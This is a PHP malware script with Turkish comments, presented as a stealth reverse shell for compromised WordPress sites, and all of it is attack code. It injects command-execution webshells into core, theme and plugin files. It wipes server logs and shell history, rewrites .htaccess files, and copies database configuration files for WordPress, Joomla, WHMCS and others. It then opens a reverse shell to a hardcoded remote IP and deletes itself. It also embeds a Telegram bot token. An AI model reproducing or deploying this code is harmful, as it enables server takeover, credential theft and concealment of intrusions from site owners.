<?php
// WordPress Optimized Stealth Reverse Shell
// Otomatik port yönetimi, Telegram bildirimi, stealth deployment

error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);

// Otomatik çalışma yok - exploit bildirim gönderecek

// VDS IP ve Port ayarları
$VDS_IP = "91.232.103.237"; // VDS IP'ni buraya yaz
$BASE_PORT = 4444;
$MAX_PORTS = 5000;  // 5000 port = 4444-9443

// Telegram Bot ayarları
$BOT_TOKEN = "8499867802:AAEmbcJZFQNO9ncMI2M_BRhU1TFWb8ROM2E";
$CHAT_ID = "-1003002290194";

// Port hesaplama (domain hash'ine göre)
function getPort($domain) {
    global $BASE_PORT, $MAX_PORTS;
    $hash = crc32($domain);
    return $BASE_PORT + (abs($hash) % $MAX_PORTS);
}

// Telegram bildirimi
function sendTelegram($message) {
    global $BOT_TOKEN, $CHAT_ID;
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
    $data = [
        'chat_id' => $CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'timeout' => 10
        ]
    ]);
    
    @file_get_contents($url, false, $context);
}


// Domain ve subdomain keşfi
function discoverDomains() {
    $domains = [];
    $current_domain = $_SERVER['HTTP_HOST'];
    $domains[] = $current_domain;
    
    // Subdomain keşfi
    $subdomains = ['www', 'admin', 'mail', 'ftp', 'blog', 'shop', 'api', 'dev', 'test'];
    foreach ($subdomains as $sub) {
        $domains[] = $sub . '.' . $current_domain;
    }
    
    return $domains;
}

// WordPress keşfi
function discoverWordPress() {
    $wp_info = [];
    
    // wp-config.php bul
    $wp_config_paths = [
        '/var/www/html/wp-config.php',
        '/var/www/wp-config.php',
        '/home/*/public_html/wp-config.php',
        './wp-config.php'
    ];
    
    foreach ($wp_config_paths as $path) {
        if (file_exists($path)) {
            $wp_info['config_path'] = $path;
            break;
        }
    }
    
    // WordPress versiyonu
    if (file_exists('./wp-includes/version.php')) {
        include './wp-includes/version.php';
        $wp_info['version'] = $wp_version ?? 'Unknown';
    }
    
    // Aktif tema
    if (file_exists('./wp-content/themes/')) {
        $themes = scandir('./wp-content/themes/');
        $wp_info['themes'] = array_filter($themes, function($t) { return $t != '.' && $t != '..'; });
    }
    
    return $wp_info;
}

// Stealth webshell yerleştirme
function deployStealthWebshells() {
    $locations = [];
    
    // WordPress gizli yerler
    $wp_locations = [
        './wp-content/themes/twentytwentythree/functions.php',
        './wp-content/plugins/akismet/akismet.php',
        './wp-includes/class-wp-http.php',
        './wp-content/uploads/.htaccess',
        './wp-includes/js/jquery/jquery-migrate.min.js',
        './wp-content/themes/twentytwentyfour/functions.php',
        './wp-content/plugins/hello.php',
        './wp-includes/class-wp.php'
    ];
    
    $webshell_code = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>';
    
    foreach ($wp_locations as $location) {
        if (file_exists(dirname($location))) {
            $backup_content = '';
            if (file_exists($location)) {
                $backup_content = file_get_contents($location);
            }
            
            // Webshell'i dosyaya ekle
            $new_content = $backup_content . "\n" . $webshell_code;
            if (@file_put_contents($location, $new_content)) {
                $locations[] = $location;
            }
        }
    }
    
    // Ek gizli webshell'ler
    $hidden_locations = [
        './wp-content/uploads/shell.php',
        './wp-includes/shell.php',
        './wp-content/themes/shell.php'
    ];
    
    foreach ($hidden_locations as $location) {
        if (@file_put_contents($location, $webshell_code)) {
            $locations[] = $location;
        }
    }
    
    return $locations;
}

// Log temizleme
function cleanLogs() {
    $log_paths = [
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        './wp-content/debug.log',
        '/var/log/auth.log'
    ];
    
    foreach ($log_paths as $log) {
        if (file_exists($log)) {
            @file_put_contents($log, '');
        }
    }
    
    // Shell history temizle
    @system('history -c 2>/dev/null');
}

// .htaccess manipülasyonu (403 bypass)
function bypass403() {
    $htaccess_content = '
# 403 Bypass Rules
<Files "*.php">
    Order Allow,Deny
    Allow from all
</Files>

# Hide PHP extensions
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^([^\.]+)$ $1.php [NC,L]

# Disable directory browsing
Options -Indexes

# Custom error pages
ErrorDocument 403 /index.php
ErrorDocument 404 /index.php
';
    
    $htaccess_paths = ['./.htaccess', './wp-content/.htaccess', './wp-includes/.htaccess'];
    
    foreach ($htaccess_paths as $path) {
        @file_put_contents($path, $htaccess_content);
    }
}

// Gelişmiş backup alma fonksiyonu
function createBackup($domain) {
    $backup_dir = '/tmp/.backup_' . md5($domain);
    @mkdir($backup_dir, 0755, true);
    
    // Kapsamlı dosya pattern'leri
    $patterns = [
        'wp-config'         => '/public_html/wp-config.php',
        'word-wp'           => '/public_html/wordpress/wp-config.php',
        'wpblog'            => '/public_html/blog/wp-config.php',
        'wp-old'            => '/public_html/wp/wp-config.php',
        'wp-backup'         => '/public_html/backup/wp-config.php',
        'wp-old2'           => '/public_html/old/wp-config.php',
        'wp-2020'           => '/public_html/2020/wp-config.php',
        'wp-2021'           => '/public_html/2021/wp-config.php',
        'wp-2022'           => '/public_html/2022/wp-config.php',
        'wp-2023'           => '/public_html/2023/wp-config.php',
        'wp-new'            => '/public_html/new/wp-config.php',
        'wp-dev'            => '/public_html/dev/wp-config.php',
        'wp-stage'          => '/public_html/staging/wp-config.php',
        'wp-test'           => '/public_html/test/wp-config.php',
        'joomla-or-whmcs'   => '/public_html/configuration.php',
        'joomla'            => '/public_html/joomla/configuration.php',
        'joomla-old'        => '/public_html/old/configuration.php',
        'joomla-backup'     => '/public_html/backup/configuration.php',
        'joomla-dev'        => '/public_html/dev/configuration.php',
        'vbinc'             => '/public_html/vb/includes/config.php',
        'vb'                => '/public_html/includes/config.php',
        'vb-old'            => '/public_html/old/includes/config.php',
        'vb-backup'         => '/public_html/backup/includes/config.php',
        'conf_global'       => '/public_html/conf_global.php',
        'inc'               => '/public_html/inc/config.php',
        'config'             => '/public_html/config.php',
        'Settings'           => '/public_html/Settings.php',
        'sites'             => '/public_html/sites/default/settings.php',
        'whm'               => '/public_html/whm/configuration.php',
        'whmcs'             => '/public_html/whmcs/configuration.php',
        'supportwhmcs'      => '/public_html/support/configuration.php',
        'WHM'               => '/public_html/whmc/WHM/configuration.php',
        'whmc'              => '/public_html/whm/WHMCS/configuration.php',
        'WHMcs'             => '/public_html/whm/whmcs/configuration.php',
        'whmcsupp'          => '/public_html/support/configuration.php',
        'whmcs-cli'         => '/public_html/clients/configuration.php',
        'whmcs-cl'          => '/public_html/client/configuration.php',
        'whmcs-CL'          => '/public_html/clientes/configuration.php',
        'whmcs-Cl'          => '/public_html/cliente/configuration.php',
        'whmcs-csup'        => '/public_html/clientsupport/configuration.php',
        'whmcs-bill'        => '/public_html/billing/configuration.php',
        'whmcs-old'         => '/public_html/old/configuration.php',
        'whmcs-backup'      => '/public_html/backup/configuration.php',
        'admin-conf'        => '/public_html/admin/config.php',
        'admin-old'         => '/public_html/admin/old/config.php',
        'admin-backup'      => '/public_html/admin/backup/config.php',
        'home1-wp'          => '/home1/public_html/wp-config.php',
        'home2-wp'          => '/home2/public_html/wp-config.php',
        'home3-wp'          => '/home3/public_html/wp-config.php',
        'home4-wp'          => '/home4/public_html/wp-config.php',
        'home5-wp'          => '/home5/public_html/wp-config.php',
        'html-wp'           => '/html/wp-config.php',
        'html-pub-wp'       => '/html/public/wp-config.php',
        'www-wp'            => '/www/wp-config.php',
        'www-pub-wp'        => '/www/public/wp-config.php'
    ];
    
    $created = false;
    $backup_files = [];
    
    foreach ($patterns as $name => $path) {
        if (file_exists($path)) {
            $backup_file = $backup_dir . '/' . $name . '_' . basename($path);
            if (@copy($path, $backup_file)) {
                $backup_files[] = $name . ': ' . $path;
                $created = true;
            }
        }
    }
    
    // WordPress özel dosyalar
    $wp_files = [
        './wp-config.php',
        './wp-content/themes/',
        './wp-content/plugins/',
        './.htaccess',
        './wp-content/uploads/',
        './wp-includes/version.php'
    ];
    
    foreach ($wp_files as $file) {
        if (file_exists($file)) {
            $backup_file = $backup_dir . '/' . basename($file);
            if (is_dir($file)) {
                @system("cp -r {$file} {$backup_file} 2>/dev/null");
            } else {
                @copy($file, $backup_file);
            }
            $created = true;
        }
    }
    
    // Backup bilgisini log'a yaz
    @file_put_contents($backup_dir . '/backup_info.txt', 
        "Domain: {$domain}\n" .
        "Time: " . date('Y-m-d H:i:s') . "\n" .
        "Files backed up: " . count($backup_files) . "\n" .
        "Backup files:\n" . implode("\n", $backup_files) . "\n"
    );
    
    return $backup_dir;
}

// ==============================================
// ANA İŞLEM - URL'den erişildiğinde çalışır
// ==============================================

$domain = $_SERVER['HTTP_HOST'];
$server_info = php_uname();
$port = getPort($domain);

// Domain keşfi
$domains = discoverDomains();
$wp_info = discoverWordPress();

// Stealth webshell deployment
$webshell_locations = deployStealthWebshells();

// Log temizleme
cleanLogs();

// 403 bypass
bypass403();

// Backup alma
$backup_dir = createBackup($domain);

// Telegram bildirimi YOK - exploit gönderecek
// Manuel test için sendTelegram fonksiyonu kaldı ama çağrılmıyor

// Reverse shell bağlantısı
connectReverseShell($domain, $server_info, $port);

// Reverse shell bağlantı fonksiyonu
function connectReverseShell($domain, $server_info, $port) {
    global $VDS_IP;
    
    $sock = @fsockopen($VDS_IP, $port, $errno, $errstr, 30);
    if (!$sock) {
        // Port açma isteği gönder (VDS'e)
        $open_request = "OPEN_PORT:{$port}";
        $sock = @fsockopen($VDS_IP, 4444, $errno, $errstr, 5);
        if ($sock) {
            fwrite($sock, $open_request);
            fclose($sock);
            sleep(2); // Port açılmasını bekle
            
            // Tekrar dene
            $sock = @fsockopen($VDS_IP, $port, $errno, $errstr, 30);
        }
        
        // Hala bağlanamadıysa alternatif port dene
        if (!$sock) {
            for ($i = 1; $i <= 10; $i++) {
                $alt_port = $port + $i;
                $sock = @fsockopen($VDS_IP, $alt_port, $errno, $errstr, 5);
                if ($sock) break;
            }
        }
    }

    if ($sock) {
        global $domains, $wp_info, $webshell_locations, $backup_dir;
        
        // Detaylı bilgileri gönder
        fwrite($sock, "DOMAIN:{$domain}\n");
        fwrite($sock, "SERVER:{$server_info}\n");
        fwrite($sock, "WP_VERSION:" . ($wp_info['version'] ?? 'Unknown') . "\n");
        fwrite($sock, "BACKUP:{$backup_dir}\n");
        fwrite($sock, "DOMAINS:" . implode(",", array_slice($domains, 0, 5)) . "\n");
        fwrite($sock, "WEBSHELLS:" . implode(",", array_slice($webshell_locations, 0, 3)) . "\n");
        
        // Shell başlat
        $descriptorspec = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        
        $process = proc_open('/bin/sh', $descriptorspec, $pipes);
        
        if (is_resource($process)) {
            while (!feof($sock)) {
                $data = fread($sock, 1024);
                fwrite($pipes[0], $data);
                $output = fread($pipes[1], 1024);
                fwrite($sock, $output);
            }
            
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
        
        fclose($sock);
    }
    
    // Kendini gizle
    @unlink(__FILE__);
}
?>

